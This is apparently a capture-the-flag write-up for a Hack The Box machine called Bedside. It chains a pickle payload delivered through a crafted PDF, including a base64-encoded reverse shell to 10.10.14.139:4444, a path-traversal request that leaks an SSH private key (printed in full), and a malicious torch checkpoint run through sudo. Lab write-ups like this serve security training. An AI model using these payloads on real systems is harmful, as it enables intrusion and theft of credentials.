---
machineName: Bedside
difficulty: Medium
Status: Done
OS: Linux
start_time: 2026-07-18T21:00:00
end_time: 2026-07-19T18:56:00
player_position: "1274"
CVEs:
  - "[CVE-2025-64512](https://nvd.nist.gov/vuln/detail/CVE-2025-64512)"
  - "[CVE-2025-59341](https://nvd.nist.gov/vuln/detail/CVE-2025-59341)"
  - "[CVE-2025-32434](https://nvd.nist.gov/vuln/detail/CVE-2025-32434)"
CWEs:
  - "[CWE-502](http://cwe.mitre.org/data/definitions/502.html)"
  - "[CWE-23](http://cwe.mitre.org/data/definitions/23.html)"
tools:
  - nmap
  - ffuf
  - wafw00f
  - ZAP
exploited_programs:
  - torch
  - pickle
open_ports:
  - "80"
  - "22"
  - "3000"
aliases:
  - RCE through pickle in pdf, LFI on docker webpage to find ssh keys, find that user has sudo -l rights, another pickle RCE in torch
tags:
  - "#HTB"
iconurl: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb2f81-e429-48e1-b8b4-3eb33f64aec3-1781002059.png
---


<div style="text-align: center;">
  <img
    src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1fb2f81-e429-48e1-b8b4-3eb33f64aec3-1781002059.png"
    width="200"
  >
</div>

# First Enumeration


```sh
nmap -sC -sV -Pn -p- -T4 -oN ./bedside.htp/nmap/nmap.txt -oX ./bedside.htp/nmap/nmap.xml 10.129.54.214
```

| Port | Proto | Service | Product      | Version                 | Info         |
| ---- | ----- | ------- | ------------ | ----------------------- | ------------ |
| 22   | tcp   | ssh     | OpenSSH      | 10.0p2 Debian 7+deb13u4 | protocol 2.0 |
| 80   | tcp   | http    | Apache httpd | 2.4.68                  |              |
We see there’s an `ssh` port open, as usual, and a web server.

After checking the webserver, we see a webpage with not to much information, other tan some mails, and a publicity homepage for AI medical services.

```
ffuf -u http://bedside.htb/ -H "Host: FUZZ.bedside.htb" -w ~/Applications/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -ac
```
```

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://bedside.htb/
 :: Wordlist         : FUZZ: /home/drope/Applications/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.bedside.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 28ms]
```

We see the following research page: 

![[Pasted image 20260719193916.png]]


Here I lost a bit of time, bypassing MIME types was rather easy, I tested multiple file types but I didn’t find anything promising, I even searched how to embed payloads in .dcm files, but it seemed way too complex.

After a while ZAProxy warned me about information disclosure thanks to the header: `X-Powered-By: pdfminer.six`

After a bit of search I stumbled upon this [advisory](https://github.com/pdfminer/pdfminer.six/security/advisories/GHSA-wf5f-4jwr-ppcp)

This seemed to be the way, as `pdfminer` is meant to extract info from pdfs, and in the website we have the following phrase: 

>Certain file formats may be converted to standardized formats before being used for AI training.

Also during fuzzing, ZAP sent an empty .txt file, which showed an error message leaking the upload directory:

>MIME type mismatch. Unable to upload file to destination /var/www/research.bedside.htb/uploads

Armed with this, we can cobble up our exploit, this proved rather finicky, and I needed to reset the machine multiple times for it to work.

But basically I used their python script and modified to use a base64 encoded shell:

```python
#!/usr/bin/env python3
import pickle
import gzip

def create_demo_pickle():
    print("Creating demonstration pickle file...")

    # Create payload that executes code AND returns a dict (as pdfminer expects)
    class EvilPayload:
        def __reduce__(self):
            # This function will be called during unpickling
            code = "__import__('os').system('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzOS80NDQ0IDA+JjE= | base64 -d | /bin/bash')"
            return (eval, (code,))

    demo_cmap_data = EvilPayload()

    # Create the pickle file that the path traversal would access
    target_path = "./malicious.pickle.gz"

    try:
        with gzip.open(target_path, 'wb') as f:
            pickle.dump(demo_cmap_data, f)
        print(f"✓ Created demonstration pickle file: {target_path}")
        return target_path

    except Exception as e:
        print(f"✗ Error creating pickle file: {e}")
        return None

if __name__ == "__main__":
    create_demo_pickle()
```

Then I sent a valid pdf, and intercepted the request with ZAP, and replaced the content with the pdf content they provide.

>[!info]  Make the pdf point to: /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fmalicious

```
------geckoformboundary4d0c6bec5cabb87d62eb14c3c3776f56
  
Content-Disposition: form-data; name="uploadFile"; filename="malicious.pdf"
  
Content-Type: application/pdf
  
  
%PDF-1.4  
1 0 obj  
<<  
/Type /Catalog  
/Pages 2 0 R  
>>  
endobj  
  
2 0 obj  
<<  
/Type /Pages  
/Kids [3 0 R]  
/Count 1  
>>  
endobj  
  
3 0 obj  
<<  
/Type /Page  
/Parent 2 0 R  
/MediaBox [0 0 612 792]  
/Contents 4 0 R  
/Resources  
<<  
/Font  
<<  
/F1 5 0 R  
>>  
>>  
>>  
endobj  
  
4 0 obj  
<<  
/Length 44  
>>  
stream  
BT  
/F1 12 Tf  
100 700 Td  
(Malicious PDF) Tj  
ET  
endstream  
endobj  
  
5 0 obj  
<<  
/Type /Font  
/Subtype /Type0  
/BaseFont /MaliciousFont-Identity-H  
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fmalicious  
/DescendantFonts [6 0 R]  
>>  
endobj  
  
6 0 obj  
<<  
/Type /Font  
/Subtype /CIDFontType2  
/BaseFont /MaliciousFont  
/CIDSystemInfo  
<<  
/Registry (Adobe)  
/Ordering (Identity)  
/Supplement 0  
>>  
/FontDescriptor 7 0 R  
>>  
endobj  
  
7 0 obj  
<<  
/Type /FontDescriptor  
/FontName /MaliciousFont  
/Flags 4  
/FontBBox [-1000 -1000 1000 1000]  
/ItalicAngle 0  
/Ascent 1000  
/Descent -200  
/CapHeight 800  
/StemV 80  
>>  
endobj  
  
xref  
0 8  
0000000000 65535 f  
0000000009 00000 n  
0000000058 00000 n  
0000000115 00000 n  
0000000274 00000 n  
0000000370 00000 n  
0000000503 00000 n  
0000000673 00000 n  
trailer  
<<  
/Size 8  
/Root 1 0 R  
>>  
startxref  
871  
%%EOF  
  
------geckoformboundary4d0c6bec5cabb87d62eb14c3c3776f56--
```
 
# Second Enumeration


Now we have landed into the `datawrangler` user, which is clearly running in a very restricted docker environment, I loaded linpeass into it.

Which showed me running processes in the port 300, I curled it and it showed me some content so I was sure it is a webpage.

I loaded `socat` into the machine, and port forwarded like so: 

```
./socat  TCP-LISTEN:3001,reuseaddr,fork TCP:127.0.0.1:3000 &
```

When visiting the webpage, it was rather blank, I launched a ZAP scan on it, but nothing interesting, then I just went to: 

```html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Bedside Clinic - Image Viewer</title>
  <style>
    <SNIP>
  </style>
</head>
<body>
  <h1>Bedside Clinic - Image Viewer</h1>
  <div id="root"></div>

  <script type="module">
  	import React from './vendor/react.js';
  	import ReactDOM from './vendor/react-dom.js';
  	import _ from './vendor/lodash.js';

    // Simulate fetching multi-slice MRI + mask data
    async function fetchSlices() {
      // For demo: generate 5 slices with random masks
      const slices = [];
      for (let i = 0; i < 5; i++) {
        const mask = Array.from({ length: 5 }, () =>
          Array.from({ length: 5 }, () => Math.round(Math.random()))
        );
        slices.push({ id: `slice_${i+1}`, mask });
      }
      return slices;
    }

    function MaskGrid({ mask }) {
      return (
        <div className="mask-grid">
          {mask.flat().map((cell, idx) => (
            <div key={idx} className={`cell cell-${cell}`}>{cell}</div>
          ))}
        </div>
      );
    }

    function Viewer({ slices }) {
      const [currentIndex, setCurrentIndex] = React.useState(0);
      const slice = slices[currentIndex];

      const prevSlice = () => setCurrentIndex(idx => Math.max(0, idx - 1));
      const nextSlice = () => setCurrentIndex(idx => Math.min(slices.length - 1, idx + 1));

      return (
        <div className="viewer">
          <h2>{slice.id}</h2>
          <MaskGrid mask={slice.mask} />
          <div className="controls">
            <button onClick={prevSlice} disabled={currentIndex === 0}>Previous Slice</button>
            <span>Slice {currentIndex + 1} / {slices.length}</span>
            <button onClick={nextSlice} disabled={currentIndex === slices.length - 1}>Next Slice</button>
          </div>
        </div>
      );
    }

    function App() {
      const [slices, setSlices] = React.useState([]);

      React.useEffect(() => {
        fetchSlices().then(setSlices);
      }, []);

      return slices.length > 0 ? <Viewer slices={slices} /> : <p>Loading slices...</p>;
    }

    ReactDOM.render(<App />, document.getElementById('root'));
  </script>
</body>
</html>
<script type="module">import createHotContext from"/@hmr";const hot=createHotContext("/index.html");hot.watch(()=>location.reload());</script><script>console.log("%c💚 Built with esm.sh/x, please uncheck \"Disable cache\" in Network tab for better DX!", "color:green")</script>datawrangler@data-wrangler:/var/www/research.bedside.htb$

```

Here I was stuck for rather some time, but then this caught my eye: `Built with esm.sh/x`

So after a bit of research I found this [advisory](https://github.com/advisories/GHSA-49pv-gwxp-532r) which seemed rather easy, so I tested it out (spoiler: it worked).
First I leaked the `/etc/passwd` file to see available users, I saw that there was a `developer`, and after a bit of search I landed on this: 

```
cyber) ➜  Toolbox curl curl --path-as-is 'http://research.bedside.htb:3001/pr/x/y@99/../../../../../../../../../../home/developer/.ssh/id_rsa?raw=1&module=1'
curl: (6) Could not resolve host: curl
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----

```

## Extras

We can see that the full pdf scanner script:
```python
import subprocess
import glob
import os
import time
import sys
import uuid
import stat
from pathlib import Path

# Container paths
#UPLOAD_DIR = "/var/www/html/uploads"
UPLOAD_DIR = "/var/www/research.bedside.htb/uploads"
OUTPUT_DIR = "/datastore/staging"

TIMEOUT = 10
SLEEP_INTERVAL = 30

os.makedirs(OUTPUT_DIR, exist_ok=True)

def is_suspicious_filename(name: str) -> bool:
    if name.startswith("/") or ".." in name or name.startswith("-"):
        return True
    if any(ord(ch) < 32 for ch in name):
        return True
    return False

def process_pdf(pdf_path, randomized_name):
    filename = os.path.basename(pdf_path)

    reason = None

    # Basic filename check
    if is_suspicious_filename(filename):
        reason = "suspicious filename"
    # Reject symlinks
    else:
        st = os.lstat(pdf_path)
        if stat.S_ISLNK(st.st_mode):
            reason = "symlink"
        # Reject non-regular files
        elif not stat.S_ISREG(st.st_mode):
            reason = "non-regular file"

    if reason:
        print(f"[DEBUG] Skipping {filename}: {reason}")
        return

    output_file = os.path.join(OUTPUT_DIR, f"{randomized_name}.txt")

    try:
        subprocess.run(
            ["pdf2txt.py", pdf_path, "-o", output_file],
            timeout=TIMEOUT,
            check=True
        )
        print(f"Processed: {pdf_path} -> {output_file}")
    except subprocess.TimeoutExpired:
        print(f"Timeout expired for {pdf_path}, skipping...")
    except subprocess.CalledProcessError as e:
        print(f"Error processing {pdf_path}: {e}")
    except Exception as e:
        print(f"Unexpected error processing {pdf_path}: {e}")

def main():
    while True:
        pdf_files = glob.glob(os.path.join(UPLOAD_DIR, "*.pdf"))
        if not pdf_files:
            print("No PDF files found.")
            time.sleep(SLEEP_INTERVAL)
            continue

        for pdf_path in pdf_files:
            randomized_name = str(uuid.uuid4())
            process_pdf(pdf_path, randomized_name)

        time.sleep(SLEEP_INTERVAL)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Shutting down...")
        sys.exit(0)
```



# Privilege Escalation

As usual I ran Linpeas on it, but nothing interesting came out of it.

Then I tried this:

```
developer@bedside:~$ sudo -l
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py

```

(Jackpot!)

```python
"""
Bedside Clinic - MONAI trainer (v0.1.0-beta)

This software is an internal beta release intended for use by company staff and developers
for testing, experimentation, and development purposes only.

Key points:

- Staff must **exercise caution** and ensure proper backups of any data used with this tool.
- This tool should **not be used for clinical decision-making** or in patient care.
- Further development, testing, and validation are required before any production deployment.

Usage:
    python bedside_trainer.py [--epochs N] [--batch-size N] [--lr LR] [--scanner /dev/usbscanner0]

Notes:
- Root access is required if specifying a hardware scanner.
- RAW_DIR is currently a placeholder for future integration. Preprocessing features will be added in the future to handle more complex files (DICOM, NIfTI, etc.)
- Current data flow is as follows: [staging/] > [processed/] > (DataLoader) > model
- Script is currently fully functional with image files (jpeg, png, etc.). Refer to allowed extensions for supported types.

"""

import os
import sys
import shutil
import argparse
from pathlib import Path
from datetime import datetime
import logging
import warnings
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.tensorboard import SummaryWriter
from torch.utils.data import DataLoader

# MONAI imports
warnings.filterwarnings("ignore", category=FutureWarning)
from monai.data import Dataset, CacheDataset
from monai.transforms import (
    Compose, LoadImaged, EnsureChannelFirstd, ScaleIntensityd,
    RandSpatialCropd, ToTensord, EnsureTyped, ResizeWithPadOrCropd
)
from monai.handlers import CheckpointLoader  # <-- Correct import

# --------------------------
# Datastore paths
# --------------------------
DATASTORE_ROOT = Path("/datastore")
CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
LOGS_DIR = DATASTORE_ROOT / "logs"
MODELS_DIR = DATASTORE_ROOT / "models"
PROCESSED_DIR = DATASTORE_ROOT / "processed"
RAW_DIR = DATASTORE_ROOT / "raw"
STAGING_DIR = DATASTORE_ROOT / "staging"

for d in (CHECKPOINT_DIR, LOGS_DIR, MODELS_DIR, PROCESSED_DIR, RAW_DIR, STAGING_DIR):
    d.mkdir(parents=True, exist_ok=True)/

# --------------------------
# Logging setup
# --------------------------
log_file = LOGS_DIR / f"training_{datetime.now().strftime('%Y%m%d-%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# --------------------------
# File types
# --------------------------
ALLOWED_EXTS = {
    "jpeg", "jpg", "png", "bmp", "tiff", "tif",
    "gif", "dcm", "ima", "mhd", "raw", "nrrd",
    "nii", "gz", "hdr", "img", "zip", "tar", "tar.gz", "7z",
    "pdf", "txt", "npy"
}

# --------------------------
# Device
# --------------------------
DEVICE = torch.device("cuda" if torch.cuda.is_available() else "cpu")

# --------------------------
# Utility functions
# --------------------------
def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None

def is_nifti(p: Path):
    return p.suffix in (".nii", ".gz") and (p.name.endswith(".nii") or p.name.endswith(".nii.gz"))

def collect_processed_files(processed_dir: Path, limit=None):
    files = [p for p in processed_dir.glob("**/*") if p.is_file() and p.suffix.lower().lstrip(".") in ALLOWED_EXTS]
    if limit:
        files = files[:limit]
    return [{"image": str(p)} for p in files]

def conservative_promote_from_staging(staging_dir: Path, processed_dir: Path, max_files=100):
    promoted = 0
    for p in sorted(staging_dir.iterdir()):
        if promoted >= max_files:
            break
        if not p.is_file():
            continue
        ext = p.suffix.lower().lstrip(".")
        if ext in ALLOWED_EXTS:
            dest = processed_dir / p.name
            try:
                shutil.move(str(p), str(dest))
                promoted += 1
            except Exception as e:
                logger.warning(f"Failed to promote {p}: {e}")
    return promoted

def prepare_dataloader_from_processed(processed_dir: Path, batch_size: int):
    data = collect_processed_files(processed_dir)
    if not data:
        return None, 0

    contains_nifti = any(is_nifti(Path(d["image"])) for d in data)

    if contains_nifti:
        transforms = Compose([
            LoadImaged(keys=["image"]),
            EnsureChannelFirstd(keys=["image"]),
            ScaleIntensityd(keys=["image"]),
            RandSpatialCropd(keys=["image"], roi_size=(64,64,64), random_size=False),
            EnsureTyped(keys=["image"])
        ])
        dataset = CacheDataset(data=data, transform=transforms, cache_rate=1.0, num_workers=1)
    else:
        transforms = Compose([
            LoadImaged(keys=["image"]),
            EnsureChannelFirstd(keys=["image"]),
            ScaleIntensityd(keys=["image"]),
            ResizeWithPadOrCropd(keys=["image"], spatial_size=(64,64)),
            ToTensord(keys=["image"]),
            EnsureTyped(keys=["image"])
        ])
        dataset = Dataset(data=data, transform=transforms)

    dataloader = DataLoader(dataset, batch_size=batch_size, shuffle=True, num_workers=1)
    return dataloader, len(data)

def build_model(dataloader=None, hidden_dim=128):
    if dataloader is None:
        raise ValueError("Dataloader must be provided to infer input size.")
    sample_batch = next(iter(dataloader))["image"].to(torch.device("cpu"))
    n_features = sample_batch.numel() // sample_batch.shape[0]
    logger.info(f"Auto-detected input features: {n_features}")
    model = nn.Sequential(
        nn.Flatten(),
        nn.Linear(n_features, hidden_dim),
        nn.ReLU(),
        nn.Linear(hidden_dim, 1)
    )
    return model

# --------------------------
# Main
# --------------------------
def main():
    parser = argparse.ArgumentParser(description="MONAI trainer with datastore integration")
    parser.add_argument("--epochs", "-e", type=int, default=50, help="Number of training epochs")
    parser.add_argument("--batch-size", "-b", type=int, default=4, help="Batch size")
    parser.add_argument("--lr", type=float, default=1e-3, help="Learning rate")
    parser.add_argument("--scanner", type=str, default=None, help="Hardware scanner device (requires root)")
    args = parser.parse_args()

    if args.scanner and os.geteuid() != 0:
        logger.error("Root access required to use a hardware scanner. Exiting.")
        sys.exit(1)

    NUM_EPOCHS = args.epochs
    BATCH_SIZE = args.batch_size
    LEARNING_RATE = args.lr
    SAVE_INTERVAL = 5

    logger.info(f"Device: {DEVICE}")

    dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
    if n_data == 0:
        promoted = conservative_promote_from_staging(STAGING_DIR, PROCESSED_DIR, max_files=200)
        if promoted:
            logger.info(f"Promoted {promoted} files from staging -> processed")
            dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
        else:
            logger.warning("No data available to train. Exiting.")
            return

    logger.info(f"Using {n_data} samples for training.")

    model = build_model(dataloader).to(DEVICE)
    optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE)
    loss_fn = nn.MSELoss()

    # --------------------------
    # Checkpoint loading (MONAI-compatible callable form)
    # --------------------------
    latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
    start_epoch = 0
    if latest_ckpt:
        logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...")
        loader = CheckpointLoader(
            load_path=str(latest_ckpt),
            load_dict={"model": model, "optimizer": optimizer},
            map_location=DEVICE
        )

        # Minimal mock engine for MONAI handler compatibility
        class MockEngine:
            def __init__(self):
                self.state = type("State", (), {})()
                self.state.max_epochs = None
                self.state.epoch = 0

        engine = MockEngine()
        loader(engine)  # invoke the handler directly

        # Retrieve saved epoch if available
        if hasattr(engine.state, "epoch") and engine.state.epoch:
            start_epoch = engine.state.epoch
        elif hasattr(loader, "loaded_objects") and "epoch" in loader.loaded_objects:
            start_epoch = loader.loaded_objects["epoch"]

        logger.info(f"Resuming from epoch {start_epoch}")

    writer = SummaryWriter(log_dir=str(LOGS_DIR / datetime.now().strftime("%Y%m%d-%H%M%S")))

    # Training loop
    for epoch in range(start_epoch, NUM_EPOCHS):
        model.train()
        epoch_loss = 0.0
        for batch in dataloader:
            imgs = batch["image"].to(DEVICE)
            target = torch.zeros((imgs.shape[0], 1), device=DEVICE)

            optimizer.zero_grad()
            out = model(imgs)
            loss = loss_fn(out, target)
            loss.backward()
            optimizer.step()
            epoch_loss += float(loss.item())

        avg_loss = epoch_loss / max(1, len(dataloader))
        logger.info(f"[EPOCH {epoch+1}/{NUM_EPOCHS}] avg_loss: {avg_loss:.6f}")

        if (epoch + 1) % SAVE_INTERVAL == 0 or (epoch + 1) == NUM_EPOCHS:
            ckpt_payload = {
                "epoch": epoch + 1,
                "model": model.state_dict(),
                "optimizer": optimizer.state_dict()
            }
            ckpt_name = CHECKPOINT_DIR / f"checkpoint_epoch_{epoch+1}.pt"
            torch.save(ckpt_payload, ckpt_name)
            logger.info(f"Saved checkpoint: {ckpt_name}")

    # Save final model
    final_model_file = MODELS_DIR / f"final_model_{datetime.now().strftime('%Y%m%d-%H%M%S')}.pt"
    torch.save({"model": model.state_dict()}, final_model_file)
    logger.info(f"Saved final model: {final_model_file}")
    logger.info("Training completed.")
    writer.close()


if __name__ == "__main__":
    main()

```

This is a rather long script, but this is the supposed ML algorithm they talk about in the homepage, basically it uses the data we submitted to it. and we can provide a learning model through the `/datastore/checkpoint` folder.

After a bit of search I found this [advisory](https://github.com/InternLM/lmdeploy/security/advisories/GHSA-9pf3-7rrr-x5jh) (advisories and pickle seem to be a recurring theme in this box lol)

Basically we can upload a malicous model to get RCE.

The `developer` user didn’t have any rights over the `/datastore/checkpoint` dir. but I do remember that when I was toying around as the `datawrangler` user I did have access.

So I re-catched a reverse shell. At first I was having some crashes, but basically it needed a valid content under the `/datastore/processed` folder for it to work.

I hosted a png file with python, and downloaded it with  `curl -O`.

After that I cobbled together the following script (yes I got lazy to catch a revshell)
```python
import torch
import os

class Evil:
    def __reduce__(self):
        cmd = "cat /root/root.txt > /tmp/out.txt; chmod 666 /tmp/out.txt"
        return (os.system, (cmd,))

payload = {
    "model": Evil(),
    "optimizer": Evil(),
    "epoch": 9999
}

torch.save(payload, "./checkpoint_epoch_9999.pt")
```

I downloaded the `.pt` model under the `/datastore/processing` dir, and ran the ML script, as expected, the flag was calmly waiting for me under: `/tmp`



